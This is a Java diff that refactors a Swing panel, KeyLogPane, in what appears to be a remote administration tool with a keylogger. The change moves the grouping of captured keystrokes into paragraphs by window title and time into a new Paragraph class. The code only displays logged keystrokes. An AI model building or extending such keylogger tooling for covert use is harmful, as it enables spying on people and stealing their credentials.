@@ -29,8 +29,8 @@ import javax.swing.JScrollPane;
 import javax.swing.ScrollPaneConstants;
 
 import com.subterranean_security.crimson.core.proto.Keylogger.EV_KEvent;
-import com.subterranean_security.crimson.sv.keylogger.Event;
 import com.subterranean_security.crimson.sv.keylogger.Page;
+import com.subterranean_security.crimson.sv.keylogger.Paragraph;
 
 public class KeyLogPane extends JPanel {
 
@@ -98,33 +98,9 @@ public class KeyLogPane extends JPanel {
 
 	public void loadData(Page page) {
 		clear();
-
-		String lastTitle = null;
-		Date lastDate = null;
-
-		for (Event k : page.events) {
-			String title = page.titles.get(k.titleOffset);
-			Date date = new Date(page.ref.getTime() + k.timeOffset);
-			if (lastTitle != null && lastTitle.equals(title)) {
-				if (lastDate != null && date.getTime() - lastDate.getTime() < paragraphTimeInterval) {
-					// old paragraph
-
-					paragraphs.get(paragraphs.size() - 1).append(k.event);
-					continue;
-				}
-
-			}
-
-			// new paragraph
-			KeyLogParagraph klp = new KeyLogParagraph(title + " @ " + date.toString());
-			klp.append(k.event);
-			addParagraph(klp);
-
-			lastTitle = title;
-			lastDate = date;
-
+		for (Paragraph p : page.getParagraphs()) {
+			addParagraph(new KeyLogParagraph(p));
 		}
-
 	}
 
 	public void clear() {
@@ -156,20 +132,22 @@ public class KeyLogPane extends JPanel {
 	}
 
 	public void updateContent(EV_KEvent k) {
+		Date kdate = new Date(k.getDate());
 
 		if (paragraphs.size() > 0) {
 			KeyLogParagraph klp = paragraphs.get(paragraphs.size() - 1);
-			if (klp.getTitle().startsWith(k.getTitle() + " @")) {
-				klp.append(k.getEvent());
-				return;
+			if (klp.getParagraph().getTitle().equals(k.getTitle())) {
+				if (kdate.getTime() - klp.getParagraph().getDate().getTime() < Page.sameWindowSeparationInterval) {
+					klp.append(k.getEvent());
+					return;
+				}
+
 			}
 
 		}
 
 		// new paragraph
-		KeyLogParagraph klp = new KeyLogParagraph(k.getTitle() + " @ " + new Date(k.getDate()).toString());
-		klp.append(k.getEvent());
-		addParagraph(klp);
+		addParagraph(new KeyLogParagraph(new Paragraph(k.getTitle(), kdate, k.getEvent())));
 
 	}
 
